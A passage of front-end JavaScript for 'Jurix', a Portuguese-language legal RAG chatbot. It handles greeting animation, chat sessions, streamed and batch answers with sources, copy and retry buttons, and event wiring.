                const visibleText = words.slice(0, wordIndex + 1).join('');
                try {
                    element.innerHTML = renderMarkdown(visibleText);
                } catch (e) {
                    element.textContent = visibleText;
                }
                wordIndex++;
                scrollToBottomIfAtBottom();
                setTimeout(type, speed);
            } else {
                element.innerHTML = fullHtml;
                scrollToBottom();
                if (onComplete && typeof onComplete === 'function') onComplete();
            }
        }

        type();
    }

    // ===== SUGGESTIONS & WELCOME STATE =====
    function renderRandomSuggestions() {
        const chipsContainer = document.getElementById('suggestion-chips');
        if (!chipsContainer) return;

        const shuffled = shuffleArray(SUGGESTION_QUESTIONS);
        const selected = shuffled.slice(0, 3);

        chipsContainer.innerHTML = selected
            .map(
                (question) =>
                    `<div class="chip" data-question="${escapeAttr(question)}">${escapeHtml(question)}</div>`
            )
            .join('');
    }

    function showWelcomeStateWithStreaming() {
        let welcomeState = document.getElementById('welcome-state');
        if (!welcomeState) return;

        if (chatState && typeof chatState.isGreetingStreaming === 'function' && chatState.isGreetingStreaming()) return;

        welcomeState.style.display = 'flex';
        const greetingNameEl = welcomeState.querySelector('.greeting-name');
        const greetingTextEl = welcomeState.querySelector('.greeting-text');

        if (greetingNameEl && greetingTextEl) {
            let fullName = greetingNameEl.getAttribute('data-user-name') || config.userName || 'Admin';
            greetingTextEl.textContent = '';
            greetingNameEl.textContent = '';
            if (chatState && typeof chatState.beginGreeting === 'function') {
                chatState.beginGreeting();
            }

            const greetingText = 'Olá, ';
            let charIndex = 0;

            function streamNextChar() {
                if (charIndex < greetingText.length) {
                    greetingTextEl.textContent += greetingText[charIndex];
                    charIndex++;
                    setTimeout(streamNextChar, 25);
                } else if (charIndex < greetingText.length + fullName.length) {
                    const nameIndex = charIndex - greetingText.length;
                    greetingNameEl.textContent += fullName[nameIndex];
                    charIndex++;
                    setTimeout(streamNextChar, 40);
                } else {
                    chatState.endGreeting();
                    renderRandomSuggestions();
                }
            }

            setTimeout(streamNextChar, 100);
        } else {
            renderRandomSuggestions();
        }
    }

    function askQuestion(question) {
        const textarea = document.getElementById('question-textarea');
        if (textarea) {
            textarea.value = question;
            const form = document.getElementById('chat-form');
            if (form) form.dispatchEvent(new Event('submit'));
        }
    }

    // ===== INITIALIZATION =====
    async function initializeChatbot() {
        const sessionSlug = getSessionSlugFromPath();

        if (sessionSlug) {
            try {
                const data = await chatAPI.getSessionBySlug(sessionSlug);
                if (data.success && data.session) {
                    await loadSession(data.session.id);
                    await loadChatSessions();
                    return;
                }
                window.location.href = config.chatbotUrl;
            } catch (error) {
                console.error('Error initializing with slug:', error);
                window.location.href = config.chatbotUrl;
            }
        } else {
            currentSessionId = null;
            const messagesWrapper = document.getElementById('messages-wrapper');
            if (messagesWrapper) {
                messagesWrapper.querySelectorAll('.message').forEach((m) => m.remove());
                const welcomeState = document.getElementById('welcome-state');
                if (welcomeState) welcomeState.style.display = 'flex';
            }
            showWelcomeStateWithStreaming();
            await loadChatSessions();
        }

        updateNewChatButtonState();
    }

    // ===== EVENT LISTENERS SETUP =====
    function setupEventListeners() {
        const chatForm = document.getElementById('chat-form');
        const textarea = document.getElementById('question-textarea');
        const newChatBtn = document.getElementById('new-chat-button');
        const toggleSidebarBtn = document.getElementById('toggle-sidebar');
        const sidebar = document.getElementById('sidebar');

        if (toggleSidebarBtn && sidebar) {
            toggleSidebarBtn.addEventListener('click', () => {
                sidebar.classList.toggle('collapsed');
            });
        }

        if (newChatBtn) {
            newChatBtn.addEventListener('click', () => {
                createNewSession();
                const heroInput = document.getElementById('hero-search-input');
                if (heroInput) heroInput.focus();
            });
        }

        // Hero Search Form (Tela Inicial)
        const heroSearchForm = document.getElementById('hero-search-form');
        const heroSearchInput = document.getElementById('hero-search-input');

        if (heroSearchForm && heroSearchInput) {
            heroSearchForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const q = heroSearchInput.value.trim();
                if (q) {
                    heroSearchInput.value = '';
                    askQuestion(q);
                }
            });

            heroSearchInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault();
                    heroSearchForm.dispatchEvent(new Event('submit'));
                }
            });
        }

        // Interactive Dropdowns in Hero Panel
        document.querySelectorAll('.figma-search-dropdown').forEach((dropdown) => {
            dropdown.addEventListener('click', function (e) {
                e.stopPropagation();
                const isActive = this.classList.contains('active');
                document.querySelectorAll('.figma-search-dropdown').forEach((d) => d.classList.remove('active'));
                if (!isActive) {
                    this.classList.add('active');
                }
            });
        });

        document.addEventListener('click', () => {
            document.querySelectorAll('.figma-search-dropdown').forEach((d) => d.classList.remove('active'));
        });

        if (textarea) {
            textarea.addEventListener('input', function () {
                this.style.height = 'auto';
                this.style.height = Math.min(this.scrollHeight, 200) + 'px';
                if (currentSessionId) {
                    localStorage.setItem(`chat-input-${currentSessionId}`, this.value);
                }
            });

            textarea.addEventListener('keydown', function (e) {
                if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault();
                    if (!chatState.isBusy() && this.value.trim()) {
                        chatForm.dispatchEvent(new Event('submit'));
                    }
                }
            });
        }

        if (chatForm) {
            chatForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                if ((chatState && typeof chatState.isBusy === 'function' && chatState.isBusy()) || !textarea) return;

                const question = textarea.value.trim();
                if (!question) return;
                if (chatState && typeof chatState.setLastQuestion === 'function') {
                    chatState.setLastQuestion(question);
                }

                const welcomeStateEl = document.getElementById('welcome-state');
                if (welcomeStateEl) welcomeStateEl.style.display = 'none';

                updateNewChatButtonState();
                addUserMessage(question);

                textarea.value = '';
                textarea.style.height = 'auto';

                if (currentSessionId) {
                    localStorage.removeItem(`chat-input-${currentSessionId}`);
                }

                const wasNewSession = !currentSessionId;
                if (wasNewSession) {
                    await createSessionCardImmediately(question);
                }

                const loadingId = addLoadingMessage();
                if (chatState && typeof chatState.transition === 'function') {
                    chatState.transition('submitting', { question });
                }
                const sendButton = document.getElementById('send-button');
                if (sendButton) sendButton.disabled = true;

    function createStreamingAssistantMessage() {
        const messagesWrapper = document.getElementById('messages-wrapper');
        if (!messagesWrapper) return null;

        const timestamp = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        const messageId = 'msg-' + Date.now();
        const sourcesId = 'sources-' + Date.now();
        const copyButtonId = 'copy-btn-' + Date.now();

        const messageDiv = document.createElement('div');
        messageDiv.className = 'message message-assistant';
        messageDiv.innerHTML = `
            <div class="message-avatar">
                <img src="${escapeHtml(config.logoIconUrl)}" alt="Jurix">
            </div>
            <div class="message-content">
                <div class="message-header">
                    <span class="message-role">Jurix</span>
                    <span class="message-time">${timestamp}</span>
                </div>
                <div class="message-body jurix-rag-answer" id="${messageId}"></div>
                <div class="message-actions">
                    <button class="regenerate-button" id="regenerate-${Date.now()}" aria-label="Tentar novamente" title="Tentar novamente" style="display: none;">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 3v5h-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M3 21v-5h5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                    <button class="copy-response-button" id="${copyButtonId}" aria-label="Copiar resposta em Markdown" title="Copiar resposta">
                        <svg class="copy-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" stroke-width="2"/>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/>
                        </svg>
                        <svg class="check-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                            <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                </div>
                <div id="${sourcesId}"></div>
            </div>
        `;

        messagesWrapper.appendChild(messageDiv);
        scrollToBottom();

        const copyButton = document.getElementById(copyButtonId);
        copyButton.addEventListener('click', () => {
            copyResponseToClipboard(copyButton.getAttribute('data-markdown') || '', copyButton);
        });

        return {
            messageDiv,
            messageBody: document.getElementById(messageId),
            sourcesContainer: document.getElementById(sourcesId),
            copyButton,
            regenerateBtn: messageDiv.querySelector('.regenerate-button'),
        };
    }

    async function streamAssistantResponse(question, sessionId, onChunk, onSources, onDone, onError) {
        return chatAPI.streamAnswer(question, sessionId, {
            onChunk,
            onSources,
            onDone,
            onError,
        });
    }

                let streamElements = null;
                let accumulatedText = '';
                let finalSources = [];

                try {
                    if (chatState && typeof chatState.transition === 'function') {
                        chatState.transition('streaming', { question });
                    }
                    streamElements = createStreamingAssistantMessage();
                    removeLoadingMessage(loadingId);

                    await streamAssistantResponse(
                        question,
                        currentSessionId,
                        (chunk) => {
                            accumulatedText += chunk;
                            if (streamElements && streamElements.messageBody) {
                                if (window.JurixRagUI) {
                                    window.JurixRagUI.setStreamingState(streamElements.messageBody, true);
                                    window.JurixRagUI.scheduleRender(streamElements.messageBody, accumulatedText);
                                    window.JurixRagUI.announce('Gerando resposta…');
                                } else {
                                    streamElements.messageBody.innerHTML = renderMarkdown(accumulatedText);
                                }
                                scrollToBottomIfAtBottom();
                            }
                        },
                        (sources) => {
                            finalSources = sources || [];
                            if (streamElements && streamElements.sourcesContainer && finalSources.length > 0) {
                                showSourcesGradually(streamElements.sourcesContainer, finalSources);
                                window.requestAnimationFrame(() => {
                                    if (window.JurixRagUI) window.JurixRagUI.enhanceSources(streamElements.sourcesContainer);
                                });
                            }
                        },
                        async (doneData) => {
                            if (streamElements && window.JurixRagUI) {
                                window.JurixRagUI.flushRender(streamElements.messageBody, doneData.answer || accumulatedText);
                                window.JurixRagUI.setStreamingState(streamElements.messageBody, false);
                                window.JurixRagUI.announce('Resposta concluída.');
                            }
                            if (streamElements) {
                                if (streamElements.copyButton) {
                                    streamElements.copyButton.setAttribute('data-markdown', doneData.answer || accumulatedText);
                                    streamElements.copyButton.classList.add('show');
                                }
                                if (streamElements.regenerateBtn && currentSessionId) {
                                    streamElements.regenerateBtn.style.display = 'inline-flex';
                                    streamElements.regenerateBtn.classList.add('show');
                                    streamElements.regenerateBtn.addEventListener('click', async () => {
                                        await regenerateLastResponse(currentSessionId, streamElements.messageDiv, streamElements.sourcesContainer);
                                    });
                                }
                            }
                            if (doneData.session_id) {
                                currentSessionId = doneData.session_id;
                                chatState.setSessionId(doneData.session_id);
                                if (wasNewSession && window.tempSessionCard) {
                                    window.tempSessionCard.remove();
                                    window.tempSessionCard = null;
                                    animateSessionCreated();
                                }
                                await loadChatSessions();
                                updateNewChatButtonState();
                            }
                        },
                        (errorMsg) => {
                            chatState.transition('error', { error: errorMsg });
                            if (streamElements && streamElements.messageBody && window.JurixRagUI) {
                                window.JurixRagUI.renderErrorState(
                                    streamElements.messageBody,
                                    errorMsg,
                                    () => {
                                        const retryTextarea = document.getElementById('question-textarea');
                                        const retryForm = document.getElementById('chat-form');
                                        if (retryTextarea && retryForm) {
                                            retryTextarea.value = question;
                                            retryForm.dispatchEvent(new Event('submit'));
                                        }
                                    }
                                );
                            }
                        }
                    );
                } catch (streamError) {
                    console.warn('Real-time streaming failed, using batch fallback:', streamError);
                    if (streamElements && streamElements.messageDiv) {
                        streamElements.messageDiv.remove();
                    }

                    // Fallback to standard batch POST
                    try {
                        const data = await chatAPI.answerBatch(
                            question,
                            currentSessionId,
                            config.chatbotUrl
                        );
                        removeLoadingMessage(loadingId);

                        if (data.success) {
                            if (data.session_id) {
                                currentSessionId = data.session_id;
                                if (chatState && typeof chatState.setSessionId === 'function') {
                                    chatState.setSessionId(data.session_id);
                                }
                                if (wasNewSession && window.tempSessionCard) {
                                    window.tempSessionCard.remove();
                                    window.tempSessionCard = null;
                                    animateSessionCreated();
                                }
                                await loadChatSessions();
                                updateNewChatButtonState();
                            }

                            const answer = data.answer || 'Desculpe, não consegui gerar uma resposta.';
                            const sources = data.sources || [];
                            addAssistantMessage(answer, sources, true);
                        } else {
                            addErrorMessage(data.error || 'Erro ao processar pergunta');
                        }
                    } catch (batchError) {
                        removeLoadingMessage(loadingId);
                        chatState.transition('error', { error: batchError });
                        console.error('Request error:', batchError);
                        if (window.JurixRagUI) {
                            window.JurixRagUI.renderErrorState(
                                document.getElementById('messages-wrapper'),
                                batchError,
                                () => {
                                        const retryTextarea = document.getElementById('question-textarea');
                                        const retryForm = document.getElementById('chat-form');
                                        if (retryTextarea && retryForm) {
                                            retryTextarea.value = question;
                                            retryForm.dispatchEvent(new Event('submit'));
                                        }
                                    }
                            );
                        } else {
                            addErrorMessage('Não foi possível concluir a pesquisa.');
                        }
                    }
                } finally {
                    chatState.transition('idle');
                    if (sendButton) sendButton.disabled = false;
                    if (textarea) textarea.focus();
                }
            });
        }
    }

    // Attach lifecycle listeners
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setupEventListeners();
            initializeChatbot();
        });
    } else {
        setupEventListeners();
        initializeChatbot();
    }

    // Global namespace export
    window.jurixChat = {
        loadSession,
        createNewSession,
        deleteSession,
        askQuestion,
    };
})();
